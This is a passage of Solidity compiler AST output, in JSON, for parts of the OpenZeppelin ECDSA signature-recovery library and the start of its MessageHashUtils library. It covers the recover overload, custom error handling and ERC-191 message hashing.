le","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"},{"constant":false,"id":1833,"mutability":"mutable","name":"err","nameLocation":"5361:3:4","nodeType":"VariableDeclaration","scope":1893,"src":"5348:16:4","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_enum$_RecoverError_$1639","typeString":"enum ECDSA.RecoverError"},"typeName":{"id":1832,"nodeType":"UserDefinedTypeName","pathNode":{"id":1831,"name":"RecoverError","nameLocations":["5348:12:4"],"nodeType":"IdentifierPath","referencedDeclaration":1639,"src":"5348:12:4"},"referencedDeclaration":1639,"src":"5348:12:4","typeDescriptions":{"typeIdentifier":"t_enum$_RecoverError_$1639","typeString":"enum ECDSA.RecoverError"}},"visibility":"internal"},{"constant":false,"id":1835,"mutability":"mutable","name":"errArg","nameLocation":"5374:6:4","nodeType":"VariableDeclaration","scope":1893,"src":"5366:14:4","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_bytes32","typeString":"bytes32"},"typeName":{"id":1834,"name":"bytes32","nodeType":"ElementaryTypeName","src":"5366:7:4","typeDescriptions":{"typeIdentifier":"t_bytes32","typeString":"bytes32"}},"visibility":"internal"}],"src":"5328:53:4"},"scope":1979,"src":"5203:1551:4","stateMutability":"pure","virtual":false,"visibility":"internal"},{"body":{"id":1928,"nodeType":"Block","src":"6981:166:4","statements":[{"assignments":[1908,1911,1913],"declarations":[{"constant":false,"id":1908,"mutability":"mutable","name":"recovered","nameLocation":"7000:9:4","nodeType":"VariableDeclaration","scope":1928,"src":"6992:17:4","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":1907,"name":"address","nodeType":"ElementaryTypeName","src":"6992:7:4","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"},{"constant":false,"id":1911,"mutability":"mutable","name":"error","nameLocation":"7024:5:4","nodeType":"VariableDeclaration","scope":1928,"src":"7011:18:4","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_enum$_RecoverError_$1639","typeString":"enum ECDSA.RecoverError"},"typeName":{"id":1910,"nodeType":"UserDefinedTypeName","pathNode":{"id":1909,"name":"RecoverError","nameLocations":["7011:12:4"],"nodeType":"IdentifierPath","referencedDeclaration":1639,"src":"7011:12:4"},"referencedDeclaration":1639,"src":"7011:12:4","typeDescriptions":{"typeIdentifier":"t_enum$_RecoverError_$1639","typeString":"enum ECDSA.RecoverError"}},"visibility":"internal"},{"constant":false,"id":1913,"mutability":"mutable","name":"errorArg","nameLocation":"7039:8:4","nodeType":"VariableDeclaration","scope":1928,"src":"7031:16:4","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_bytes32","typeString":"bytes32"},"typeName":{"id":1912,"name":"bytes32","nodeType":"ElementaryTypeName","src":"7031:7:4","typeDescriptions":{"typeIdentifier":"t_bytes32","typeString":"bytes32"}},"visibility":"internal"}],"id":1920,"initialValue":{"arguments":[{"id":1915,"name":"hash","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1896,"src":"7062:4:4","typeDescriptions":{"typeIdentifier":"t_bytes32","typeString":"bytes32"}},{"id":1916,"name":"v","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1898,"src":"7068:1:4","typeDescriptions":{"typeIdentifier":"t_uint8","typeString":"uint8"}},{"id":1917,"name":"r","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1900,"src":"7071:1:4","typeDescriptions":{"typeIdentifier":"t_bytes32","typeString":"bytes32"}},{"id":1918,"name":"s","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1902,"src":"7074:1:4","typeDescriptions":{"typeIdentifier":"t_bytes32","typeString":"bytes32"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_bytes32","typeString":"bytes32"},{"typeIdentifier":"t_uint8","typeString":"uint8"},{"typeIdentifier":"t_bytes32","typeString":"bytes32"},{"typeIdentifier":"t_bytes32","typeString":"bytes32"}],"id":1914,"name":"tryRecover","nodeType":"Identifier","overloadedDeclarations":[1705,1785,1893],"referencedDeclaration":1893,"src":"7051:10:4","typeDescriptions":{"typeIdentifier":"t_function_internal_pure$_t_bytes32_$_t_uint8_$_t_bytes32_$_t_bytes32_$returns$_t_address_$_t_enum$_RecoverError_$1639_$_t_bytes32_$","typeString":"function (bytes32,uint8,bytes32,bytes32) pure returns (address,enum ECDSA.RecoverError,bytes32)"}},"id":1919,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"7051:25:4","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$_t_address_$_t_enum$_RecoverError_$1639_$_t_bytes32_$","typeString":"tuple(address,enum ECDSA.RecoverError,bytes32)"}},"nodeType":"VariableDeclarationStatement","src":"6991:85:4"},{"expression":{"arguments":[{"id":1922,"name":"error","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1911,"src":"7098:5:4","typeDescriptions":{"typeIdentifier":"t_enum$_RecoverError_$1639","typeString":"enum ECDSA.RecoverError"}},{"id":1923,"name":"errorArg","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1913,"src":"7105:8:4","typeDescriptions":{"typeIdentifier":"t_bytes32","typeString":"bytes32"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_enum$_RecoverError_$1639","typeString":"enum ECDSA.RecoverError"},{"typeIdentifier":"t_bytes32","typeString":"bytes32"}],"id":1921,"name":"_throwError","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1978,"src":"7086:11:4","typeDescriptions":{"typeIdentifier":"t_function_internal_pure$_t_enum$_RecoverError_$1639_$_t_bytes32_$returns$__$","typeString":"function (enum ECDSA.RecoverError,bytes32) pure"}},"id":1924,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"7086:28:4","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$__$","typeString":"tuple()"}},"id":1925,"nodeType":"ExpressionStatement","src":"7086:28:4"},{"expression":{"id":1926,"name":"recovered","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1908,"src":"7131:9:4","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"functionReturnParameters":1906,"id":1927,"nodeType":"Return","src":"7124:16:4"}]},"documentation":{"id":1894,"nodeType":"StructuredDocumentation","src":"6760:122:4","text":" @dev Overload of {ECDSA-recover} that receives the `v`,\n `r` and `s` signature fields separately."},"id":1929,"implemented":true,"kind":"function","modifiers":[],"name":"recover","nameLocation":"6896:7:4","nodeType":"FunctionDefinition","parameters":{"id":1903,"nodeType":"ParameterList","parameters":[{"constant":false,"id":1896,"mutability":"mutable","name":"hash","nameLocation":"6912:4:4","nodeType":"VariableDeclaration","scope":1929,"src":"6904:12:4","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_bytes32","typeString":"bytes32"},"typeName":{"id":1895,"name":"bytes32","nodeType":"ElementaryTypeName","src":"6904:7:4","typeDescriptions":{"typeIdentifier":"t_bytes32","typeString":"bytes32"}},"visibility":"internal"},{"constant":false,"id":1898,"mutability":"mutable","name":"v","nameLocation":"6924:1:4","nodeType":"VariableDeclaration","scope":1929,"src":"6918:7:4","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint8","typeString":"uint8"},"typeName":{"id":1897,"name":"uint8","nodeType":"ElementaryTypeName","src":"6918:5:4","typeDescriptions":{"typeIdentifier":"t_uint8","typeString":"uint8"}},"visibility":"internal"},{"constant":false,"id":1900,"mutability":"mutable","name":"r","nameLocation":"6935:1:4","nodeType":"VariableDeclaration","scope":1929,"src":"6927:9:4","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_bytes32","typeString":"bytes32"},"typeName":{"id":1899,"name":"bytes32","nodeType":"ElementaryTypeName","src":"6927:7:4","typeDescriptions":{"typeIdentifier":"t_bytes32","typeString":"bytes32"}},"visibility":"internal"},{"constant":false,"id":1902,"mutability":"mutable","name":"s","nameLocation":"6946:1:4","nodeType":"VariableDeclaration","scope":1929,"src":"6938:9:4","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_bytes32","typeString":"bytes32"},"typeName":{"id":1901,"name":"bytes32","nodeType":"ElementaryTypeName","src":"6938:7:4","typeDescriptions":{"typeIdentifier":"t_bytes32","typeString":"bytes32"}},"visibility":"internal"}],"src":"6903:45:4"},"returnParameters":{"id":1906,"nodeType":"ParameterList","parameters":[{"constant":false,"id":1905,"mutability":"mutable","name":"","nameLocation":"-1:-1:-1","nodeType":"VariableDeclaration","scope":1929,"src":"6972:7:4","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":1904,"name":"address","nodeType":"ElementaryTypeName","src":"6972:7:4","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"}],"src":"6971:9:4"},"scope":1979,"src":"6887:260:4","stateMutability":"pure","virtual":false,"visibility":"internal"},{"body":{"id":1977,"nodeType":"Block","src":"7352:460:4","statements":[{"condition":{"commonType":{"typeIdentifier":"t_enum$_RecoverError_$1639","typeString":"enum ECDSA.RecoverError"},"id":1941,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":1938,"name":"error","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1933,"src":"7366:5:4","typeDescriptions":{"typeIdentifier":"t_enum$_RecoverError_$1639","typeString":"enum ECDSA.RecoverError"}},"nodeType":"BinaryOperation","operator":"==","rightExpression":{"expression":{"id":1939,"name":"RecoverError","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1639,"src":"7375:12:4","typeDescriptions":{"typeIdentifier":"t_type$_t_enum$_RecoverError_$1639_$","typeString":"type(enum ECDSA.RecoverError)"}},"id":1940,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"memberLocation":"7388:7:4","memberName":"NoError","nodeType":"MemberAccess","referencedDeclaration":1635,"src":"7375:20:4","typeDescriptions":{"typeIdentifier":"t_enum$_RecoverError_$1639","typeString":"enum ECDSA.RecoverError"}},"src":"7366:29:4","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"falseBody":{"condition":{"commonType":{"typeIdentifier":"t_enum$_RecoverError_$1639","typeString":"enum ECDSA.RecoverError"},"id":1947,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":1944,"name":"error","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1933,"src":"7462:5:4","typeDescriptions":{"typeIdentifier":"t_enum$_RecoverError_$1639","typeString":"enum ECDSA.RecoverError"}},"nodeType":"BinaryOperation","operator":"==","rightExpression":{"expression":{"id":1945,"name":"RecoverError","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1639,"src":"7471:12:4","typeDescriptions":{"typeIdentifier":"t_type$_t_enum$_RecoverError_$1639_$","typeString":"type(enum ECDSA.RecoverError)"}},"id":1946,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"memberLocation":"7484:16:4","memberName":"InvalidSignature","nodeType":"MemberAccess","referencedDeclaration":1636,"src":"7471:29:4","typeDescriptions":{"typeIdentifier":"t_enum$_RecoverError_$1639","typeString":"enum ECDSA.RecoverError"}},"src":"7462:38:4","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"falseBody":{"condition":{"commonType":{"typeIdentifier":"t_enum$_RecoverError_$1639","typeString":"enum ECDSA.RecoverError"},"id":1955,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":1952,"name":"error","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1933,"src":"7567:5:4","typeDescriptions":{"typeIdentifier":"t_enum$_RecoverError_$1639","typeString":"enum ECDSA.RecoverError"}},"nodeType":"BinaryOperation","operator":"==","rightExpression":{"expression":{"id":1953,"name":"RecoverError","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1639,"src":"7576:12:4","typeDescriptions":{"typeIdentifier":"t_type$_t_enum$_RecoverError_$1639_$","typeString":"type(enum ECDSA.RecoverError)"}},"id":1954,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"memberLocation":"7589:22:4","memberName":"InvalidSignatureLength","nodeType":"MemberAccess","referencedDeclaration":1637,"src":"7576:35:4","typeDescriptions":{"typeIdentifier":"t_enum$_RecoverError_$1639","typeString":"enum ECDSA.RecoverError"}},"src":"7567:44:4","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"falseBody":{"condition":{"commonType":{"typeIdentifier":"t_enum$_RecoverError_$1639","typeString":"enum ECDSA.RecoverError"},"id":1967,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":1964,"name":"error","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1933,"src":"7701:5:4","typeDescriptions":{"typeIdentifier":"t_enum$_RecoverError_$1639","typeString":"enum ECDSA.RecoverError"}},"nodeType":"BinaryOperation","operator":"==","rightExpression":{"expression":{"id":1965,"name":"RecoverError","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1639,"src":"7710:12:4","typeDescriptions":{"typeIdentifier":"t_type$_t_enum$_RecoverError_$1639_$","typeString":"type(enum ECDSA.RecoverError)"}},"id":1966,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"memberLocation":"7723:17:4","memberName":"InvalidSignatureS","nodeType":"MemberAccess","referencedDeclaration":1638,"src":"7710:30:4","typeDescriptions":{"typeIdentifier":"t_enum$_RecoverError_$1639","typeString":"enum ECDSA.RecoverError"}},"src":"7701:39:4","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":1973,"nodeType":"IfStatement","src":"7697:109:4","trueBody":{"id":1972,"nodeType":"Block","src":"7742:64:4","statements":[{"errorCall":{"arguments":[{"id":1969,"name":"errorArg","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1935,"src":"7786:8:4","typeDescriptions":{"typeIdentifier":"t_bytes32","typeString":"bytes32"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_bytes32","typeString":"bytes32"}],"id":1968,"name":"ECDSAInvalidSignatureS","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1652,"src":"7763:22:4","typeDescriptions":{"typeIdentifier":"t_function_error_pure$_t_bytes32_$returns$_t_error_$","typeString":"function (bytes32) pure returns (error)"}},"id":1970,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"7763:32:4","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_error","typeString":"error"}},"id":1971,"nodeType":"RevertStatement","src":"7756:39:4"}]}},"id":1974,"nodeType":"IfStatement","src":"7563:243:4","trueBody":{"id":1963,"nodeType":"Block","src":"7613:78:4","statements":[{"errorCall":{"arguments":[{"arguments":[{"id":1959,"name":"errorArg","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1935,"src":"7670:8:4","typeDescriptions":{"typeIdentifier":"t_bytes32","typeString":"bytes32"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_bytes32","typeString":"bytes32"}],"id":1958,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"7662:7:4","typeDescriptions":{"typeIdentifier":"t_type$_t_uint256_$","typeString":"type(uint256)"},"typeName":{"id":1957,"name":"uint256","nodeType":"ElementaryTypeName","src":"7662:7:4","typeDescriptions":{}}},"id":1960,"isConstant":false,"isLValue":false,"isPure":false,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"7662:17:4","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":1956,"name":"ECDSAInvalidSignatureLength","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1647,"src":"7634:27:4","typeDescriptions":{"typeIdentifier":"t_function_error_pure$_t_uint256_$returns$_t_error_$","typeString":"function (uint256) pure returns (error)"}},"id":1961,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"7634:46:4","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_error","typeString":"error"}},"id":1962,"nodeType":"RevertStatement","src":"7627:53:4"}]}},"id":1975,"nodeType":"IfStatement","src":"7458:348:4","trueBody":{"id":1951,"nodeType":"Block","src":"7502:55:4","statements":[{"errorCall":{"arguments":[],"expression":{"argumentTypes":[],"id":1948,"name":"ECDSAInvalidSignature","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1642,"src":"7523:21:4","typeDescriptions":{"typeIdentifier":"t_function_error_pure$__$returns$_t_error_$","typeString":"function () pure returns (error)"}},"id":1949,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"7523:23:4","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_error","typeString":"error"}},"id":1950,"nodeType":"RevertStatement","src":"7516:30:4"}]}},"id":1976,"nodeType":"IfStatement","src":"7362:444:4","trueBody":{"id":1943,"nodeType":"Block","src":"7397:55:4","statements":[{"functionReturnParameters":1937,"id":1942,"nodeType":"Return","src":"7411:7:4"}]}}]},"documentation":{"id":1930,"nodeType":"StructuredDocumentation","src":"7153:122:4","text":" @dev Optionally reverts with the corresponding custom error according to the `error` argument provided."},"id":1978,"implemented":true,"kind":"function","modifiers":[],"name":"_throwError","nameLocation":"7289:11:4","nodeType":"FunctionDefinition","parameters":{"id":1936,"nodeType":"ParameterList","parameters":[{"constant":false,"id":1933,"mutability":"mutable","name":"error","nameLocation":"7314:5:4","nodeType":"VariableDeclaration","scope":1978,"src":"7301:18:4","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_enum$_RecoverError_$1639","typeString":"enum ECDSA.RecoverError"},"typeName":{"id":1932,"nodeType":"UserDefinedTypeName","pathNode":{"id":1931,"name":"RecoverError","nameLocations":["7301:12:4"],"nodeType":"IdentifierPath","referencedDeclaration":1639,"src":"7301:12:4"},"referencedDeclaration":1639,"src":"7301:12:4","typeDescriptions":{"typeIdentifier":"t_enum$_RecoverError_$1639","typeString":"enum ECDSA.RecoverError"}},"visibility":"internal"},{"constant":false,"id":1935,"mutability":"mutable","name":"errorArg","nameLocation":"7329:8:4","nodeType":"VariableDeclaration","scope":1978,"src":"7321:16:4","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_bytes32","typeString":"bytes32"},"typeName":{"id":1934,"name":"bytes32","nodeType":"ElementaryTypeName","src":"7321:7:4","typeDescriptions":{"typeIdentifier":"t_bytes32","typeString":"bytes32"}},"visibility":"internal"}],"src":"7300:38:4"},"returnParameters":{"id":1937,"nodeType":"ParameterList","parameters":[],"src":"7352:0:4"},"scope":1979,"src":"7280:532:4","stateMutability":"pure","virtual":false,"visibility":"private"}],"scope":1980,"src":"344:7470:4","usedErrors":[1642,1647,1652],"usedEvents":[]}],"src":"112:7703:4"},"id":4},"@openzeppelin/contracts/utils/cryptography/MessageHashUtils.sol":{"ast":{"absolutePath":"@openzeppelin/contracts/utils/cryptography/MessageHashUtils.sol","exportedSymbols":{"MessageHashUtils":[2065],"Strings":[1631]},"id":2066,"license":"MIT","nodeType":"SourceUnit","nodes":[{"id":1981,"literals":["solidity","^","0.8",".20"],"nodeType":"PragmaDirective","src":"123:24:5"},{"absolutePath":"@openzeppelin/contracts/utils/Strings.sol","file":"../Strings.sol","id":1983,"nameLocation":"-1:-1:-1","nodeType":"ImportDirective","scope":2066,"sourceUnit":1632,"src":"149:39:5","symbolAliases":[{"foreign":{"id":1982,"name":"Strings","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1631,"src":"157:7:5","typeDescriptions":{}},"nameLocation":"-1:-1:-1"}],"unitAlias":""},{"abstract":false,"baseContracts":[],"canonicalName":"MessageHashUtils","contractDependencies":[],"contractKind":"library","documentation":{"id":1984,"nodeType":"StructuredDocumentation","src":"190:330:5","text":" @dev Signature message hash utilities for producing digests to be consumed by {ECDSA} recovery or signing.\n The library provides methods for generating a hash of a message that conforms to the\n https://eips.ethereum.org/EIPS/eip-191[ERC-191] and https://eips.ethereum.org/EIPS/eip-712[EIP 712]\n specifications."},"fullyImplemented":true,"id":2065,"linearizedBaseContracts":[2065],"name":"MessageHashUtils","nameLocation":"529:16:5","nodeType":"ContractDefinition","nodes":[{"body":{"id":1993,"nodeType":"Block","src":"1339:341:5","statements":[{"AST":{"nativeSrc":"1374:300:5","nodeType":"YulBlock","src":"1374:300:5","statements":[{"expression":{"arguments":[{"kind":"number","nativeSrc":"1395:4:5","nodeType":"YulLiteral","src":"1395:4:5","type":"","value":"0x00"},{"hexValue":"19457468657265756d205369676e6564204d6573736167653a0a3332","kind":"string","nativeSrc":"1401:34:5","nodeType":"YulLiteral","src":"1401:34:5","type":"","value":"\u0019Ethereum Signed Message:\n32"}],"functionName":{"name":"mstore","nativeSrc":"1388:6:5","nodeType":"YulIdentifier","src":"1388:6:5"},"nativeSrc":"1388:48:5","nodeType":"YulFunctionCall","src":"1388:48:5"},"nativeSrc":"1388:48:5","nodeType":"YulExpressionStatement","src":"1388:48:5"},{"expression":{"arguments":[{"kind":"number","nativeSrc":"1497:4:5","nodeType":"YulLiteral","src":"1497:4:5","type":"","value":"0x1c"},{"name":"messageHash","nativeSrc":"1503:11:5","nodeType":"YulIdentifier","src":"1503:11:5"}],"functionName":{"name":"mstore","nativeSrc":"1490:6:5","nodeType":"YulIdentifier","src":"1490:6:5"},"nativeSrc":"1490:25:5","nodeType":"YulFunctionCall","src":"1490:25:5"},"nativeSrc":"1490:25:5","nodeType":"YulExpressionStatement","src":"1490:25:5"},{"nativeSrc":"1569:31:5","nodeType":"YulAssignment","src":"1569:31:5","value":{"arguments":[{"kind":"number","nativeSrc":"1589:4:5","nodeType":"YulLiteral","src":"1589:4:5","type":"","value":"0x00"},{"kind":"number","nativeSrc":"1595:4:5","nodeType":"YulLiteral","src":"1595:4:5","type":"","value":"0x3c"}],"functionName":{"name":"keccak256","nativeSrc":"1579:9:5","nodeType":"YulIdentifier","src":"1579:9:5"},"nativeSrc":"1579:21:5","nodeType":"YulFunctionCall","src":"1579:21:5"},"variableNames":[{"name":"digest","nativeSrc":"1569:6:5","nodeType":"YulIdentifier","src":"1569:6:5"}]}]},"evmVersion":"paris","externalReferences":[{"declaration":1990,"isOffset":false,"isSlot":false,"src":"1569:6:5","valueSize":1},{"declaration":1987,"isOffset":false,"isSlot":false,"src":"1503:11:5","valueSize":1}],"flags":["memory-safe"],"id":1992,"nodeType":"InlineAssembly","src":"1349:325:5"}]},"documentation":{"id":1985,"nodeType":"StructuredDocumentation","src":"552:690:5","text":" @dev Returns the keccak256 digest of an ERC-191 signed data with version\n `0x45` (`personal_sign` messages).\n The digest is calculated by prefixing a bytes32 `messageHash` with\n `\"\\x19Ethereum Signed Message:\\n32\"` and hashing the result. It corresponds with the\n hash signed when using the https://ethereum.org/en/developers/docs/apis/json-rpc/#eth_sign[`eth_sign`] JSON-RPC method.\n NOTE: The `messageHash` parameter is intended to be the result of hashing a raw message with\n keccak256, although any bytes32 value can be safely used because the final digest will\n be re-hashed.\n See {ECDSA-recover}."},"id":1994,"implemented":true,"kind":"function","modifiers":[],"name":"toEthSignedMessageHash","nameLocation":"1256:22:5","nodeType":"FunctionDefinition","parameters":{"id":1988,"nodeType":"ParameterList","parameters":[{"constant":false,"id":1987,"mutability":"mutable","name":"messageHash","nameLocation":"1287:11:5","nodeType":"VariableDeclaration","scope":1994,"src":"1279:19:5","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_bytes32","typeString":"bytes32"},"typeName":{"id":1986,"name":"bytes32","nodeType":"ElementaryTypeName","src":"1279:7:5","typeDescriptions":{"typeIdentifier":"t_bytes32","typeString":"bytes32"}},"visibility":"internal"}],"src":"1278:21:5"},"returnParameters":{"id":1991,"nodeType":"ParameterList","parameters":[{"constant":false,"id":1990,"mutability":"mutable","name":"digest","nameLocation":"1331:6:5","nodeType":"VariableDeclaration","scope":1994,"src":"1323:14:5","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_bytes32","typeString":"bytes32"},"typeName":{"id":1989,"name":"bytes32","nodeType":"ElementaryTypeName","src":"1323:7:5","typeDescriptions":{"typeIdentifier":"t_bytes32","typeString":"bytes32"}},"visibility":"internal"}],"src":"1322:16:5"},"scope":2065,"src":"1247:433:5","stateMutability":"pure","virtual":false,"visibility":"internal"},{"body":{"id":2019,"nodeType":"Block","src":"2257:143:5","statements":[{"expression":{"arguments":[{"arguments":[{"hexValue":"19457468657265756d205369676e6564204d6573736167653a0a","id":2006,"isConstant":false,"isLValue":false,"isPure":true,"kind":"string","lValueRequested":false,"nodeType":"Literal","src":"2309:32:5","typeDescriptions":{"typeIdentifier":"t_stringliteral_9af2d9c228f6cfddaa6d1e5b94e0bce4ab16bd9a472a2b7fbfd74ebff4c720b4","typeString":"literal_string hex\"19457468657265756d205369676e6564204d6573736167653a0a\""},"value":"\u0019Ethereum Signed Message:\n"},{"arguments":[{"arguments":[{"expression":{"id":2011,"name":"message","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1997,"src":"2366:7:5","typeDescriptions":{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes memory"}},"id":2012,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"memberLocation":"2374:6:5","memberName":"length","nodeType":"MemberAccess","src":"2366:14:5","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_uint256","typeString":"uint256"}],"expression":{"id":2009,"name":"Strings","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1631,"src":"2349:7:5","typeDescriptions":{"typeIdentifier":"t_type$_t_contract$_Strings_$1631_$","typeString":"type(library Strings)"}},"id":2010,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"memberLocation":"2357:8:5","memberName":"toString","nodeType":"MemberAccess","referencedDeclaration":343,"src":"2349:16:5","typeDescriptions":{"typeIdentifier":"t_function_internal_pure$_t_uint256_$returns$_t_string_memory_ptr_$","typeString":"function (uint256) pure returns (string memory)"}},"id":2013,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"2349:32:5","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_string_memory_ptr","typeString":"string memory"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_string_memory_ptr","typeString":"string memory"}],"id":2008,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"2343:5:5","typeDescriptions":{"typeIdentifier":"t_type$_t_bytes_storage_ptr_$","typeString":"type(bytes storage pointer)"},"typeName":{"id":2007,"name":"bytes","nodeType":"ElementaryTypeName","src":"2343:5:5","typeDescriptions":{}}},"id":2014,"isConstant":false,"isLValue":false,"isPure":false,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"2343:39:5","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes memory"}},{"id":2015,"name":"message","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1997,"src":"2384:7:5","typeDescriptions":{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes memory"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_stringliteral_9af2d9c228f6cfddaa6d1e5b94e0bce4ab16bd9a472a2b7fbfd74ebff4c720b4","typeString":"literal_string hex\"19457468657265756d205369676e6564204d6573736167653a0a\""},{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes memory"},{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes memory"}],"expression":{"id":2004,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"2296:5:5","typeDescriptions":{"typeIdentifier":"t_type$_t_bytes_storage_ptr_$","typeString":"type(bytes storage pointer)"},"typeName":{"id":2003,"name":"bytes","nodeType":"ElementaryTypeName","src":"2296:5:5","typeDescriptions":{}}},"id":2005,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"memberLocation":"2302:6:5","memberName":"concat","nodeType":"MemberAccess","src":"2296:12:5","typeDescriptions":{"typeIdentifier":"t_function_bytesconcat_pure$__$returns$_t_bytes_memory_ptr_$","typeString":"function () pure returns (bytes memory)"}},"id":2016,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"2296:96:5","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes memory"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes 